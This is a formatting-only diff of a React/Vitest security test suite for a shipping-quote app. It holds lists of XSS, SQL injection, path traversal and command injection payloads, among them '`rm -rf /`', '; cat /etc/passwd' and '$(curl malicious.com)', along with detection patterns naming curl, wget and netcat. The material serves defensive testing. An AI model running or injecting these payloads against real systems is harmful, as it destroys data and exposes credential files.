@@ -25,7 +25,7 @@ const mockDOMPurify = {
       .replace(/<embed/gi, '');
   }),
   isValidAttribute: vi.fn().mockReturnValue(true),
-  addHook: vi.fn()
+  addHook: vi.fn(),
 };
 
 // Mock CSP (Content Security Policy) violations
@@ -36,7 +36,7 @@ Object.defineProperty(window, 'SecurityPolicyViolationEvent', {
     public blockedURI: string;
     public sourceFile: string;
     public lineNumber: number;
-    
+
     constructor(type: string, eventInitDict: any) {
       super(type, eventInitDict);
       this.violatedDirective = eventInitDict.violatedDirective || '';
@@ -45,7 +45,7 @@ Object.defineProperty(window, 'SecurityPolicyViolationEvent', {
       this.lineNumber = eventInitDict.lineNumber || 0;
     }
   },
-  configurable: true
+  configurable: true,
 });
 
 // Mock crypto API for secure random generation
@@ -57,20 +57,20 @@ Object.defineProperty(window, 'crypto', {
       }
       return array;
     }),
-    randomUUID: vi.fn().mockImplementation(() => 
+    randomUUID: vi.fn().mockImplementation(() =>
       'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
-        const r = Math.random() * 16 | 0;
-        const v = c === 'x' ? r : (r & 0x3 | 0x8);
+        const r = (Math.random() * 16) | 0;
+        const v = c === 'x' ? r : (r & 0x3) | 0x8;
         return v.toString(16);
-      })
+      }),
     ),
     subtle: {
       digest: vi.fn().mockResolvedValue(new ArrayBuffer(32)),
       encrypt: vi.fn().mockResolvedValue(new ArrayBuffer(16)),
-      decrypt: vi.fn().mockResolvedValue(new ArrayBuffer(16))
-    }
+      decrypt: vi.fn().mockResolvedValue(new ArrayBuffer(16)),
+    },
   },
-  configurable: true
+  configurable: true,
 });
 
 // Mock Web Authentication API for security testing
@@ -82,8 +82,8 @@ Object.defineProperty(navigator, 'credentials', {
       rawId: new ArrayBuffer(16),
       response: {
         clientDataJSON: new ArrayBuffer(32),
-        attestationObject: new ArrayBuffer(64)
-      }
+        attestationObject: new ArrayBuffer(64),
+      },
     }),
     get: vi.fn().mockResolvedValue({
       id: 'mock-credential-id',
@@ -92,21 +92,21 @@ Object.defineProperty(navigator, 'credentials', {
       response: {
         clientDataJSON: new ArrayBuffer(32),
         authenticatorData: new ArrayBuffer(64),
-        signature: new ArrayBuffer(32)
-      }
-    })
+        signature: new ArrayBuffer(32),
+      },
+    }),
   },
-  configurable: true
+  configurable: true,
 });
 
 // Mock dependencies
 vi.mock('@/contexts/AuthContext', () => ({
   useAuth: () => ({
-    user: { 
-      id: 'security-user-id', 
+    user: {
+      id: 'security-user-id',
       email: 'security@example.com',
       role: 'customer',
-      mfa_enabled: true
+      mfa_enabled: true,
     },
   }),
 }));
@@ -128,16 +128,16 @@ const securityTestQuote: UnifiedQuote = {
   expires_at: '2024-02-15T10:00:00Z',
   final_total_usd: 299.99,
   item_price: 249.99,
-  sales_tax_price: 20.00,
-  merchant_shipping_price: 15.00,
-  international_shipping: 25.00,
-  customs_and_ecs: 12.50,
-  domestic_shipping: 7.50,
-  handling_charge: 5.00,
-  insurance_amount: 2.50,
+  sales_tax_price: 20.0,
+  merchant_shipping_price: 15.0,
+  international_shipping: 25.0,
+  customs_and_ecs: 12.5,
+  domestic_shipping: 7.5,
+  handling_charge: 5.0,
+  insurance_amount: 2.5,
   payment_gateway_fee: 3.75,
-  vat: 0.00,
-  discount: 10.00,
+  vat: 0.0,
+  discount: 10.0,
   destination_country: 'IN',
   origin_country: 'US',
   website: 'amazon.com',
@@ -145,26 +145,28 @@ const securityTestQuote: UnifiedQuote = {
     info: {
       name: 'Security Test User',
       email: 'security@example.com',
-      phone: '+91-9876543210'
-    }
+      phone: '+91-9876543210',
+    },
   },
   shipping_address: {
-    formatted: '123 Security Street, Mumbai, Maharashtra 400001, India'
+    formatted: '123 Security Street, Mumbai, Maharashtra 400001, India',
   },
-  items: [{
-    id: 'security-item',
-    name: 'Test Security Product',
-    description: 'Product for security testing',
-    quantity: 1,
-    price: 249.99,
-    product_url: 'https://amazon.com/security-product',
-    image_url: 'https://example.com/security.jpg'
-  }],
+  items: [
+    {
+      id: 'security-item',
+      name: 'Test Security Product',
+      description: 'Product for security testing',
+      quantity: 1,
+      price: 249.99,
+      product_url: 'https://amazon.com/security-product',
+      image_url: 'https://example.com/security.jpg',
+    },
+  ],
   notes: 'Security test quote',
   admin_notes: '',
   priority: 'medium',
   in_cart: false,
-  attachments: []
+  attachments: [],
 };
 
 // Malicious payloads for security testing
@@ -179,21 +181,21 @@ const maliciousPayloads = {
     '<embed src="javascript:alert(\'XSS\')">',
     '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
     '<style>@import "javascript:alert(\'XSS\')"</style>',
-    '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">'
+    '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
   ],
   sql_injection: [
     "'; DROP TABLE quotes; --",
     "' OR '1'='1",
     "' UNION SELECT * FROM users --",
     "'; INSERT INTO quotes VALUES ('malicious') --",
-    "' AND SLEEP(5) --"
+    "' AND SLEEP(5) --",
   ],
   path_traversal: [
     '../../../etc/passwd',
     '..\\..\\..\\windows\\system32\\config\\sam',
     '/etc/shadow',
     'C:\\Windows\\System32\\drivers\\etc\\hosts',
-    '....//....//....//etc/passwd'
+    '....//....//....//etc/passwd',
   ],
   command_injection: [
     '; cat /etc/passwd',
@@ -201,8 +203,8 @@ const maliciousPayloads = {
     '& whoami',
     '`rm -rf /`',
     '$(curl malicious.com)',
-    '${cat /etc/passwd}'
-  ]
+    '${cat /etc/passwd}',
+  ],
 };
 
 // Helper function to render components with providers
@@ -217,11 +219,9 @@ const renderWithProviders = (component: React.ReactNode) => {
   return render(
     <QueryClientProvider client={queryClient}>
       <BrowserRouter>
-        <QuoteThemeProvider>
-          {component}
-        </QuoteThemeProvider>
+        <QuoteThemeProvider>{component}</QuoteThemeProvider>
       </BrowserRouter>
-    </QueryClientProvider>
+    </QueryClientProvider>,
   );
 };
 
@@ -239,7 +239,7 @@ describe('Security Compliance Tests', () => {
     it('should sanitize malicious scripts in form inputs', async () => {
       const XSSProtectionTest = () => {
         const [sanitizedValue, setSanitizedValue] = React.useState('');
-        
+
         const handleInputChange = (value: string) => {
           // Simulate sanitization
           const cleaned = mockDOMPurify.sanitize(value);
@@ -288,14 +288,16 @@ describe('Security Compliance Tests', () => {
           info: {
             name: '<img src=x onerror=alert("XSS")>Malicious User',
             email: 'user@example.com',
-            phone: '+1234567890'
-          }
+            phone: '+1234567890',
+          },
         },
-        items: [{
-          ...securityTestQuote.items[0],
-          name: '<svg onload=alert("XSS")>Malicious Product',
-          description: '<iframe src="javascript:alert(\'XSS\')"></iframe>Evil description'
-        }]
+        items: [
+          {
+            ...securityTestQuote.items[0],
+            name: '<svg onload=alert("XSS")>Malicious Product',
+            description: '<iframe src="javascript:alert(\'XSS\')"></iframe>Evil description',
+          },
+        ],
       };
 
       const XSSDisplayTest = () => {
@@ -305,20 +307,12 @@ describe('Security Compliance Tests', () => {
 
         return (
           <div>
-            <div data-testid="quote-id">
-              {sanitizeContent(maliciousQuote.display_id)}
-            </div>
+            <div data-testid="quote-id">{sanitizeContent(maliciousQuote.display_id)}</div>
             <div data-testid="customer-name">
               {sanitizeContent(maliciousQuote.customer_data.info.name)}
             </div>
-            <div data-testid="product-name">
-              {sanitizeContent(maliciousQuote.items[0].name)}
-            </div>
-            <UnifiedQuoteCard
-              quote={maliciousQuote}
-              viewMode="customer"
-              layout="detail"
-            />
+            <div data-testid="product-name">{sanitizeContent(maliciousQuote.items[0].name)}</div>
+            <UnifiedQuoteCard quote={maliciousQuote} viewMode="customer" layout="detail" />
           </div>
         );
       };
@@ -340,7 +334,7 @@ describe('Security Compliance Tests', () => {
     it('should handle DOM manipulation attempts', async () => {
       const DOMManipulationTest = () => {
         const [userContent, setUserContent] = React.useState('');
-        
+
         const handleUserInput = (content: string) => {
           // Sanitize before setting in state
           const sanitized = mockDOMPurify.sanitize(content);
@@ -367,7 +361,7 @@ describe('Security Compliance Tests', () => {
           });
 
           observer.observe(document.body, { childList: true, subtree: true });
-          
+
           return () => observer.disconnect();
         }, []);
 
@@ -378,10 +372,7 @@ describe('Security Compliance Tests', () => {
               onChange={(e) => handleUserInput(e.target.value)}
               placeholder="Enter content"
             />
-            <div 
-              data-testid="user-content"
-              dangerouslySetInnerHTML={{ __html: userContent }}
-            />
+            <div data-testid="user-content" dangerouslySetInnerHTML={{ __html: userContent }} />
           </div>
         );
       };
@@ -404,7 +395,7 @@ describe('Security Compliance Tests', () => {
     it('should validate CSRF tokens on form submissions', async () => {
       const CSRFProtectionTest = () => {
         const [csrfToken, setCsrfToken] = React.useState('');
-        
+
         React.useEffect(() => {
           // Generate CSRF token
           const token = window.crypto.randomUUID();
@@ -417,7 +408,7 @@ describe('Security Compliance Tests', () => {
           if (submittedToken !== csrfToken) {
             throw new Error('CSRF token validation failed');
           }
-          
+
           return { success: true };
         };
 
@@ -439,7 +430,9 @@ describe('Security Compliance Tests', () => {
 
       await waitFor(() => {
         const tokenElement = screen.getByTestId('csrf-token');
-        expect(tokenElement.textContent).toMatch(/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/);
+        expect(tokenElement.textContent).toMatch(
+          /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/,
+        );
       });
 
       // Fill form with valid data
@@ -459,7 +452,7 @@ describe('Security Compliance Tests', () => {
     it('should reject requests with invalid CSRF tokens', async () => {
       const InvalidCSRFTest = () => {
         const [error, setError] = React.useState('');
-        
+
         const handleSubmit = async (formData: any) => {
           try {
             // Simulate invalid CSRF token
@@ -497,7 +490,9 @@ describe('Security Compliance Tests', () => {
       await user.click(submitButton);
 
       await waitFor(() => {
-        expect(screen.getByTestId('error-message')).toHaveTextContent('CSRF token validation failed');
+        expect(screen.getByTestId('error-message')).toHaveTextContent(
+          'CSRF token validation failed',
+        );
       });
     });
   });
@@ -506,23 +501,23 @@ describe('Security Compliance Tests', () => {
     it('should validate and reject SQL injection attempts', async () => {
       const SQLInjectionTest = () => {
         const [validationErrors, setValidationErrors] = React.useState<string[]>([]);
-        
+
         const validateInput = (input: string) => {
           const errors = [];
-          
+
           // Check for SQL injection patterns
           const sqlPatterns = [
             /('|(\\')|(;)|(\\;)|(\\)|(\\))/g,
             /((\\+)|(;|(\\;))|(\\)|(\\)))*('|(\\'))/g,
-            /(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION|SCRIPT)/gi
+            /(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION|SCRIPT)/gi,
           ];
-          
+
           sqlPatterns.forEach((pattern, index) => {
             if (pattern.test(input)) {
               errors.push(`SQL injection pattern detected (${index + 1})`);
             }
           });
-          
+
           return errors;
         };
 
@@ -533,9 +528,7 @@ describe('Security Compliance Tests', () => {
 
         return (
           <div>
-            <div data-testid="validation-errors">
-              {validationErrors.join(', ')}
-            </div>
+            <div data-testid="validation-errors">{validationErrors.join(', ')}</div>
             <input
               data-testid="sql-test-input"
               onChange={(e) => handleInputChange(e.target.value)}
@@ -564,7 +557,7 @@ describe('Security Compliance Tests', () => {
     it('should prevent path traversal attacks', async () => {
       const PathTraversalTest = () => {
         const [isValidPath, setIsValidPath] = React.useState(true);
-        
+
         const validatePath = (path: string) => {
           // Check for path traversal patterns
           const dangerousPatterns = [
@@ -572,10 +565,10 @@ describe('Security Compliance Tests', () => {
             /\/etc\//g,
             /\/windows\//g,
             /\\system32\\/g,
-            /\.\.\\|\.\.\//g
+            /\.\.\\|\.\.\//g,
           ];
-          
-          return !dangerousPatterns.some(pattern => pattern.test(path));
+
+          return !dangerousPatterns.some((pattern) => pattern.test(path));
         };
 
         const handleFileInput = (value: string) => {
@@ -585,9 +578,7 @@ describe('Security Compliance Tests', () => {
 
         return (
           <div>
-            <div data-testid="path-validation">
-              {isValidPath ? 'valid' : 'invalid'}
-            </div>
+            <div data-testid="path-validation">{isValidPath ? 'valid' : 'invalid'}</div>
             <input
               data-testid="file-path-input"
               onChange={(e) => handleFileInput(e.target.value)}
@@ -615,16 +606,16 @@ describe('Security Compliance Tests', () => {
     it('should prevent command injection attempts', async () => {
       const CommandInjectionTest = () => {
         const [isSafeCommand, setIsSafeCommand] = React.useState(true);
-        
+
         const validateCommand = (cmd: string) => {
           // Check for command injection patterns
           const commandPatterns = [
             /[;&|`$(){}[\]]/g,
             /(rm|del|format|cat|ls|dir|whoami|curl|wget|nc|netcat)/gi,
-            /(\||&|;|`|\$\(|\$\{)/g
+            /(\||&|;|`|\$\(|\$\{)/g,
           ];
-          
-          return !commandPatterns.some(pattern => pattern.test(cmd));
+
+          return !commandPatterns.some((pattern) => pattern.test(cmd));
         };
 
         const handleCommandInput = (value: string) => {
@@ -634,9 +625,7 @@ describe('Security Compliance Tests', () => {
 
         return (
           <div>
-            <div data-testid="command-validation">
-              {isSafeCommand ? 'safe' : 'dangerous'}
-            </div>
+            <div data-testid="command-validation">{isSafeCommand ? 'safe' : 'dangerous'}</div>
             <input
               data-testid="command-input"
               onChange={(e) => handleCommandInput(e.target.value)}
@@ -666,39 +655,52 @@ describe('Security Compliance Tests', () => {
     it('should validate file types and prevent malicious uploads', async () => {
       const FileUploadSecurityTest = () => {
         const [uploadResult, setUploadResult] = React.useState('');
-        
+
         const validateFile = (file: File) => {
           // Allowed file types
           const allowedTypes = [
-            'image/jpeg', 'image/png', 'image/gif',
-            'application/pdf', 'text/plain',
-            'application/msword', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
+            'image/jpeg',
+            'image/png',
+            'image/gif',
+            'application/pdf',
+            'text/plain',
+            'application/msword',
+            'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
           ];
-          
+
           // Dangerous extensions
           const dangerousExtensions = [
-            '.exe', '.bat', '.cmd', '.scr', '.pif', '.com',
-            '.js', '.vbs', '.jar', '.zip', '.rar'
+            '.exe',
+            '.bat',
+            '.cmd',
+            '.scr',
+            '.pif',
+            '.com',
+            '.js',
+            '.vbs',
+            '.jar',
+            '.zip',
+            '.rar',
           ];
-          
+
           const fileName = file.name.toLowerCase();
           const fileType = file.type;
-          
+
           // Check file type
           if (!allowedTypes.includes(fileType)) {
             return { valid: false, reason: 'File type not allowed' };
           }
-          
+
           // Check extension
-          if (dangerousExtensions.some(ext => fileName.endsWith(ext))) {
+          if (dangerousExtensions.some((ext) => fileName.endsWith(ext))) {
             return { valid: false, reason: 'Dangerous file extension' };
           }
-          
+
           // Check file size (max 10MB)
           if (file.size > 10 * 1024 * 1024) {
             return { valid: false, reason: 'File too large' };
           }
-          
+
           return { valid: true, reason: 'File valid' };
         };
 
@@ -713,11 +715,7 @@ describe('Security Compliance Tests', () => {
         return (
           <div>
             <div data-testid="upload-result">{uploadResult}</div>
-            <input
-              type="file"
-              data-testid="file-upload"
-              onChange={handleFileUpload}
-            />
+            <input type="file" data-testid="file-upload" onChange={handleFileUpload} />
           </div>
         );
       };
@@ -727,7 +725,7 @@ describe('Security Compliance Tests', () => {
 
       // Test malicious file
       const maliciousFile = new File(['malicious content'], 'virus.exe', {
-        type: 'application/octet-stream'
+        type: 'application/octet-stream',
       });
 
       const fileInput = screen.getByTestId('file-upload');
@@ -739,7 +737,7 @@ describe('Security Compliance Tests', () => {
 
       // Test valid file
       const validFile = new File(['valid content'], 'document.pdf', {
-        type: 'application/pdf'
+        type: 'application/pdf',
       });
 
       await user.upload(fileInput, validFile);
@@ -752,10 +750,10 @@ describe('Security Compliance Tests', () => {
     it('should scan file content for malicious patterns', async () => {
       const FileContentScanTest = () => {
         const [scanResult, setScanResult] = React.useState('');
-        
+
         const scanFileContent = async (file: File) => {
           const content = await file.text();
-          
+
           // Scan for malicious patterns
           const maliciousPatterns = [
             /<script/gi,
@@ -764,15 +762,15 @@ describe('Security Compliance Tests', () => {
             /onload=/gi,
             /onerror=/gi,
             /eval\(/gi,
-            /document\.write/gi
+            /document\.write/gi,
           ];
-          
-          const foundPattern = maliciousPatterns.find(pattern => pattern.test(content));
-          
+
+          const foundPattern = maliciousPatterns.find((pattern) => pattern.test(content));
+
           if (foundPattern) {
             return { safe: false, reason: 'Malicious content detected' };
           }
-          
+
           return { safe: true, reason: 'Content safe' };
         };
 
@@ -787,11 +785,7 @@ describe('Security Compliance Tests', () => {
         return (
           <div>
             <div data-testid="scan-result">{scanResult}</div>
-            <input
-              type="file"
-              data-testid="content-scan-upload"
-              onChange={handleFileUpload}
-            />
+            <input type="file" data-testid="content-scan-upload" onChange={handleFileUpload} />
           </div>
         );
       };
@@ -800,9 +794,11 @@ describe('Security Compliance Tests', () => {
       renderWithProviders(<FileContentScanTest />);
 
       // Test file with malicious content
-      const maliciousContent = new File([
-        '<script>alert("malicious")</script>Normal content here'
-      ], 'malicious.txt', { type: 'text/plain' });
+      const maliciousContent = new File(
+        ['<script>alert("malicious")</script>Normal content here'],
+        'malicious.txt',
+        { type: 'text/plain' },
+      );
 
       const fileInput = screen.getByTestId('content-scan-upload');
       await user.upload(fileInput, maliciousContent);
@@ -817,25 +813,28 @@ describe('Security Compliance Tests', () => {
     it('should detect and report CSP violations', async () => {
       const CSPViolationTest = () => {
         const [violations, setViolations] = React.useState<string[]>([]);
-        
+
         React.useEffect(() => {
           const handleCSPViolation = (event: SecurityPolicyViolationEvent) => {
             const violation = `${event.violatedDirective}: ${event.blockedURI}`;
-            setViolations(prev => [...prev, violation]);
-            
+            setViolations((prev) => [...prev, violation]);
+
             // Report to server (mock)
             console.warn('CSP Violation:', {
               directive: event.violatedDirective,
               blockedURI: event.blockedURI,
               sourceFile: event.sourceFile,
-              lineNumber: event.lineNumber
+              lineNumber: event.lineNumber,
             });
           };
 
           document.addEventListener('securitypolicyviolation', handleCSPViolation as EventListener);
-          
+
           return () => {
-            document.removeEventListener('securitypolicyviolation', handleCSPViolation as EventListener);
+            document.removeEventListener(
+              'securitypolicyviolation',
+              handleCSPViolation as EventListener,
+            );
           };
         }, []);
 
@@ -845,9 +844,9 @@ describe('Security Compliance Tests', () => {
             violatedDirective: 'script-src',
             blockedURI: 'inline',
             sourceFile: 'https://example.com/page',
-            lineNumber: 42
+            lineNumber: 42,
           });
-          
+
           document.dispatchEvent(violation);
         };
 
@@ -881,7 +880,7 @@ describe('Security Compliance Tests', () => {
     it('should enforce strict CSP policies', async () => {
       const StrictCSPTest = () => {
         const [policy, setPolicy] = React.useState('');
-        
+
         React.useEffect(() => {
           // Mock strict CSP policy
           const strictPolicy = [
@@ -897,20 +896,16 @@ describe('Security Compliance Tests', () => {
             "worker-src 'none'",
             "frame-ancestors 'none'",
             "base-uri 'self'",
-            "form-action 'self'"
+            "form-action 'self'",
           ].join('; ');
-          
+
           setPolicy(strictPolicy);
         }, []);
 
         return (
           <div>
             <div data-testid="csp-policy">{policy}</div>
-            <UnifiedQuoteCard
-              quote={securityTestQuote}
-              viewMode="customer"
-              layout="detail"
-            />
+            <UnifiedQuoteCard quote={securityTestQuote} viewMode="customer" layout="detail" />
           </div>
         );
       };
@@ -930,15 +925,15 @@ describe('Security Compliance Tests', () => {
     it('should validate user permissions for sensitive actions', async () => {
       const PermissionValidationTest = () => {
         const [actionResult, setActionResult] = React.useState('');
-        
+
         const validatePermission = (action: string, userRole: string) => {
           const permissions = {
             admin: ['view', 'edit', 'delete', 'approve', 'export'],
             moderator: ['view', 'edit', 'approve'],
             customer: ['view', 'edit_own'],
-            guest: ['view']
+            guest: ['view'],
           };
-          
+
           const userPermissions = permissions[userRole as keyof typeof permissions] || [];
           return userPermissions.includes(action);
         };
@@ -984,12 +979,12 @@ describe('Security Compliance Tests', () => {
     it('should implement secure session management', async () => {
       const SessionSecurityTest = () => {
         const [sessionStatus, setSessionStatus] = React.useState('active');
-        
+
         React.useEffect(() => {
           // Mock secure session management
           const sessionTimeout = 30 * 60 * 1000; // 30 minutes
           const lastActivity = Date.now();
-          
+
           const checkSessionValidity = () => {
             const now = Date.now();
             if (now - lastActivity > sessionTimeout) {
@@ -1001,7 +996,7 @@ describe('Security Compliance Tests', () => {
           };
 
           const sessionCheck = setInterval(checkSessionValidity, 60000); // Check every minute
-          
+
           return () => clearInterval(sessionCheck);
         }, []);
 
@@ -1041,8 +1036,8 @@ describe('Security Compliance Tests', () => {
       const DataAnonymizationTest = () => {
         const anonymizeData = (data: any, fields: string[]) => {
           const anonymized = { ...data };
-          
-          fields.forEach(field => {
+
+          fields.forEach((field) => {
             if (anonymized[field]) {
               if (field.includes('email')) {
                 // Anonymize email
@@ -1057,12 +1052,15 @@ describe('Security Compliance Tests', () => {
               }
             }
           });
-          
+
           return anonymized;
         };
 
         const sensitiveFields = ['email', 'phone', 'address'];
-        const anonymizedQuote = anonymizeData(securityTestQuote.customer_data.info, sensitiveFields);
+        const anonymizedQuote = anonymizeData(
+          securityTestQuote.customer_data.info,
+          sensitiveFields,
+        );
 
         return (
           <div>
@@ -1087,27 +1085,23 @@ describe('Security Compliance Tests', () => {
     it('should provide data export functionality for GDPR compliance', async () => {
       const GDPRExportTest = () => {
         const [exportData, setExportData] = React.useState('');
-        
+
         const exportUserData = () => {
           // Mock GDPR data export
           const userData = {
             personal_info: {
               name: securityTestQuote.customer_data.info.name,
               email: securityTestQuote.customer_data.info.email,
-              phone: securityTestQuote.customer_data.info.phone
+              phone: securityTestQuote.customer_data.info.phone,
             },
             quotes: [securityTestQuote],
             activity_log: [
               { action: 'quote_created', timestamp: '2024-01-15T10:00:00Z' },
-              { action: 'quote_approved', timestamp: '2024-01-16T11:00:00Z' }
+              { action: 'quote_approved', timestamp: '2024-01-16T11:00:00Z' },
             ],
-            data_processing_purposes: [
-              'Service delivery',
-              'Communication',
-              'Legal compliance'
-            ]
+            data_processing_purposes: ['Service delivery', 'Communication', 'Legal compliance'],
           };
-          
+
           setExportData(JSON.stringify(userData, null, 2));
         };
 
@@ -1116,12 +1110,8 @@ describe('Security Compliance Tests', () => {
             <button onClick={exportUserData} data-testid="export-data">
               Export My Data
             </button>
-            <div data-testid="export-result">
-              {exportData ? 'Data exported' : 'No export'}
-            </div>
-            <pre data-testid="exported-data">
-              {exportData.substring(0, 200)}...
-            </pre>
+            <div data-testid="export-result">{exportData ? 'Data exported' : 'No export'}</div>
+            <pre data-testid="exported-data">{exportData.substring(0, 200)}...</pre>
           </div>
         );
       };
